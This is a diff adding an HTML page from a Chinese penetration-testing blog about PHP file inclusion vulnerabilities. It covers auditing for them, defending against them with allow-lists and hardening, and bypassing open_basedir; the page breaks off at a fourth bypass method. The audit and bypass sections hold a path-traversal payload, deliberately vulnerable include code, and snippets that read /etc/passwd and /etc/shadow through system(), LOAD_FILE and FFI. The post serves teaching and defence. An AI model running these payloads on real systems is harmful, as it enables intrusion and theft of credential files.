@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="引言文件包含漏洞（File Inclusion Vulnerability）是 Web 安全中最具破坏性的漏洞之一。从源码泄露到远程代码执行（RCE），攻击者通过利用不安全的文件包含逻辑逐层突破，最终拿到系统控制权。本文从代码审计视角出发，系统梳理 PHP 环境下文件包含漏洞的挖掘方法、防御策略与多种绕过技巧。 一、代码审计：定位文件包含点在 PHP 代码审计中，应建立对核心函数的”条件反射”——">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞：防御与代码审计">
+<meta property="og:url" content="https://congliang.github.io/File-inclusion-defense/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="引言文件包含漏洞（File Inclusion Vulnerability）是 Web 安全中最具破坏性的漏洞之一。从源码泄露到远程代码执行（RCE），攻击者通过利用不安全的文件包含逻辑逐层突破，最终拿到系统控制权。本文从代码审计视角出发，系统梳理 PHP 环境下文件包含漏洞的挖掘方法、防御策略与多种绕过技巧。 一、代码审计：定位文件包含点在 PHP 代码审计中，应建立对核心函数的”条件反射”——">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-10-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.869Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="方法论">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/File-inclusion-defense/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/File-inclusion-defense/","path":"File-inclusion-defense/","title":"文件包含漏洞：防御与代码审计"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件包含漏洞：防御与代码审计 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%AE%9A%E4%BD%8D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">一、代码审计：定位文件包含点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%A0%B8%E5%BF%83%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 核心危险函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E4%B8%89%E7%A7%8D%E5%85%B8%E5%9E%8B%E5%AE%A1%E8%AE%A1%E6%A8%A1%E5%BC%8F"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 三种典型审计模式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5"><span class="nav-number">3.</span> <span class="nav-text">二、防御策略</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%88Allow-List%EF%BC%89%E2%80%94-%E6%9C%80%E5%BD%BB%E5%BA%95%E7%9A%84%E6%96%B9%E6%A1%88"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 白名单（Allow List）— 最彻底的方案</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E8%BE%93%E5%85%A5%E6%A0%A1%E9%AA%8C%EF%BC%88%E6%AC%A1%E9%80%89%E6%96%B9%E6%A1%88%EF%BC%89"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 输入校验（次选方案）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E7%A6%81%E7%94%A8%E5%8D%B1%E9%99%A9%E5%B0%81%E8%A3%85%E5%99%A8%EF%BC%88Wrapper%EF%BC%89"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 禁用危险封装器（Wrapper）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95-PHP-%E5%BC%95%E6%93%8E%E9%9A%94%E7%A6%BB"><span class="nav-number">3.4.</span> <span class="nav-text">2.4 上传目录 PHP 引擎隔离</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81open-basedir-%E9%99%90%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-number">4.</span> <span class="nav-text">三、open_basedir 限制与绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81disable-functions-%E7%BB%95%E8%BF%87%E4%B8%8E-LFI-%E7%BB%84%E5%90%88%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">四、disable_functions 绕过与 LFI 组合利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81PHP-chroot-Jail-%E4%B8%8E%E9%80%83%E9%80%B8"><span class="nav-number">6.</span> <span class="nav-text">五、PHP chroot Jail 与逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%94%BB%E5%87%BB%E9%93%BE%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.</span> <span class="nav-text">六、攻击链示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A3%80%E6%9F%A5%E6%B8%85%E5%8D%95"><span class="nav-number">8.</span> <span class="nav-text">七、代码审计检查清单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%98%B2%E5%BE%A1%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="nav-number">9.</span> <span class="nav-text">八、防御最佳实践</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E5%BC%80%E5%8F%91%E8%80%85%E6%B8%85%E5%8D%95"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 开发者清单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E8%BF%90%E7%BB%B4%E5%8A%A0%E5%9B%BA%E6%B8%85%E5%8D%95"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 运维加固清单</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E9%98%B2%E5%BE%A1%E9%AA%A8%E6%9E%B6%E4%BB%A3%E7%A0%81"><span class="nav-number">9.3.</span> <span class="nav-text">8.3 防御骨架代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">10.</span> <span class="nav-text">九、免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/File-inclusion-defense/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件包含漏洞：防御与代码审计 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含漏洞：防御与代码审计
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-10-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-10-01T08:00:00+08:00">2025-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>文件包含漏洞（File Inclusion Vulnerability）是 Web 安全中最具破坏性的漏洞之一。从源码泄露到远程代码执行（RCE），攻击者通过利用不安全的文件包含逻辑逐层突破，最终拿到系统控制权。本文从代码审计视角出发，系统梳理 PHP 环境下文件包含漏洞的挖掘方法、防御策略与多种绕过技巧。</p>
+<h2 id="一、代码审计：定位文件包含点"><a href="#一、代码审计：定位文件包含点" class="headerlink" title="一、代码审计：定位文件包含点"></a>一、代码审计：定位文件包含点</h2><p>在 PHP 代码审计中，应建立对核心函数的”条件反射”——看到它们立即追踪参数来源。</p>
+<h3 id="1-1-核心危险函数"><a href="#1-1-核心危险函数" class="headerlink" title="1.1 核心危险函数"></a>1.1 核心危险函数</h3><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>风险说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>include()</code> &#x2F; <code>include_once()</code></td>
+<td>包含并执行文件，文件不存在时仅 E_WARNING，脚本继续执行</td>
+</tr>
+<tr>
+<td><code>require()</code> &#x2F; <code>require_once()</code></td>
+<td>包含并执行文件，文件不存在时 E_COMPILE_ERROR，脚本终止</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td>读取文件内容为字符串。若结果传入 <code>eval()</code> 或写入可解析文件，则升级为代码执行</td>
+</tr>
+<tr>
+<td><code>fopen()</code> &#x2F; <code>file()</code> &#x2F; <code>readfile()</code></td>
+<td>读取任意文件，配合 <code>allow_url_fopen</code> 可实现 SSRF</td>
+</tr>
+<tr>
+<td><code>show_source()</code> &#x2F; <code>highlight_file()</code></td>
+<td>语法高亮显示源码，直接泄露敏感文件</td>
+</tr>
+<tr>
+<td><code>simplexml_load_file()</code> &#x2F; <code>DOMDocument::load()</code></td>
+<td>XXE 场景下可读取文件或配合 <code>expect://</code> 实现 RCE</td>
+</tr>
+<tr>
+<td><code>fread()</code> &#x2F; <code>fgets()</code></td>
+<td>在已打开句柄前提下读取内容，配合目录穿越泄露信息</td>
+</tr>
+</tbody></table>
+<h3 id="1-2-三种典型审计模式"><a href="#1-2-三种典型审计模式" class="headerlink" title="1.2 三种典型审计模式"></a>1.2 三种典型审计模式</h3><p><strong>模式一：直接输入拼接</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 无过滤直接包含</span></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路径穿越</span></span><br><span class="line"><span class="variable">$template</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;template&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/var/www/templates/&#x27;</span> . <span class="variable">$template</span>);</span><br><span class="line"><span class="comment">// Payload: ../../../../etc/passwd%00 (PHP &lt; 5.3.4)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>模式二：间接输入</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT template FROM pages WHERE id=&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$row</span>[<span class="string">&#x27;template&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><strong>模式三：二次利用（日志&#x2F;Session 投毒）</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ua</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];  <span class="comment">// 攻击者可控</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/log/app.log&#x27;</span>, <span class="variable">$ua</span>, FILE_APPEND);</span><br><span class="line"><span class="comment">// 后续由另一处 LFI 包含此日志文件 → 代码执行</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Audit Grep 参考：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -rn <span class="string">&quot;include\|include_once\|require\|require_once&quot;</span> --include=<span class="string">&quot;*.php&quot;</span> .</span><br><span class="line">grep -rn <span class="string">&quot;file_get_contents\|fopen\|file\|readfile\|show_source&quot;</span> --include=<span class="string">&quot;*.php&quot;</span> .</span><br><span class="line">grep -rn <span class="string">&quot;include.*\$_\|require.*\$_&quot;</span> --include=<span class="string">&quot;*.php&quot;</span> .</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、防御策略"><a href="#二、防御策略" class="headerlink" title="二、防御策略"></a>二、防御策略</h2><h3 id="2-1-白名单（Allow-List）—-最彻底的方案"><a href="#2-1-白名单（Allow-List）—-最彻底的方案" class="headerlink" title="2.1 白名单（Allow List）— 最彻底的方案"></a>2.1 白名单（Allow List）— 最彻底的方案</h3><p>将所有允许包含的文件路径预定义在映射表中，用户输入仅作为索引键：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allowed</span> = [</span><br><span class="line">    <span class="string">&#x27;home&#x27;</span>    =&gt; <span class="string">&#x27;/var/www/app/views/home.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;about&#x27;</span>   =&gt; <span class="string">&#x27;/var/www/app/views/about.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;contact&#x27;</span> =&gt; <span class="string">&#x27;/var/www/app/views/contact.php&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;home&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$page</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Page not found&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$allowed</span>[<span class="variable">$page</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>设计原则：键值映射、默认 fallback、拒绝即终止。</p>
+<h3 id="2-2-输入校验（次选方案）"><a href="#2-2-输入校验（次选方案）" class="headerlink" title="2.2 输入校验（次选方案）"></a>2.2 输入校验（次选方案）</h3><p>当业务需要动态路径拼接时：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_-]+$/&#x27;</span>, <span class="variable">$page</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid page name&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/app/views/&#x27;</span> . <span class="variable">$page</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="variable">$real</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$real</span> === <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$real</span>, <span class="string">&#x27;/var/www/app/views/&#x27;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Access denied&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$real</span>);</span><br></pre></td></tr></table></figure>
+
+<p>注意：<code>realpath()</code> 在文件不存在时返回 <code>false</code>，建议仅校验目录 <code>dirname(realpath($file))</code>。</p>
+<h3 id="2-3-禁用危险封装器（Wrapper）"><a href="#2-3-禁用危险封装器（Wrapper）" class="headerlink" title="2.3 禁用危险封装器（Wrapper）"></a>2.3 禁用危险封装器（Wrapper）</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; php.ini</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">Off</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">Off</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>封装器</th>
+<th>风险</th>
+<th>建议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>php://input</code></td>
+<td>严重 — 直接代码执行</td>
+<td>禁用</td>
+</tr>
+<tr>
+<td><code>php://filter</code></td>
+<td>高 — 源码泄露</td>
+<td>按需禁用</td>
+</tr>
+<tr>
+<td><code>data://</code></td>
+<td>严重 — 内联代码执行</td>
+<td>禁用</td>
+</tr>
+<tr>
+<td><code>expect://</code></td>
+<td>严重 — 系统命令执行</td>
+<td>禁用</td>
+</tr>
+<tr>
+<td><code>phar://</code></td>
+<td>高 — 反序列化 RCE</td>
+<td>限制上传目录</td>
+</tr>
+<tr>
+<td><code>zip://</code></td>
+<td>中 — 压缩包内文件包含</td>
+<td>限制上传目录</td>
+</tr>
+</tbody></table>
+<h3 id="2-4-上传目录-PHP-引擎隔离"><a href="#2-4-上传目录-PHP-引擎隔离" class="headerlink" title="2.4 上传目录 PHP 引擎隔离"></a>2.4 上传目录 PHP 引擎隔离</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Apache — 上传目录禁用 PHP</span></span><br><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/var/www/html/uploads&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">php_flag</span> engine <span class="literal">off</span></span><br><span class="line">    <span class="attribute">RemoveHandler</span> .php .phtml .php3 .php4 .php5 .php7 .php8</span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx — 上传目录拒绝 PHP 处理</span></span><br><span class="line"><span class="section">location</span> /uploads/ &#123;</span><br><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123; <span class="attribute">deny</span> all; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、open-basedir-限制与绕过"><a href="#三、open-basedir-限制与绕过" class="headerlink" title="三、open_basedir 限制与绕过"></a>三、open_basedir 限制与绕过</h2><p><code>open_basedir</code> 是 PHP 提供的目录级沙箱，但它不是安全边界，存在多种绕过手段。</p>
+<p><strong>方法一：命令执行直接绕过</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /etc/passwd&#x27;</span>);     <span class="comment">// 不受 open_basedir 约束</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;ls -la /root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;cat /etc/shadow&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：MySQL LOAD_FILE 绕过</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;)&quot;</span>);</span><br><span class="line"><span class="comment">// LOAD_FILE 在 MySQL 层面执行，不受 PHP open_basedir 限制</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方法三：FFI 扩展绕过（PHP 7.4+）</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /etc/passwd&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法四：glob:&#x2F;&#x2F; 封装器绕过</strong></p>
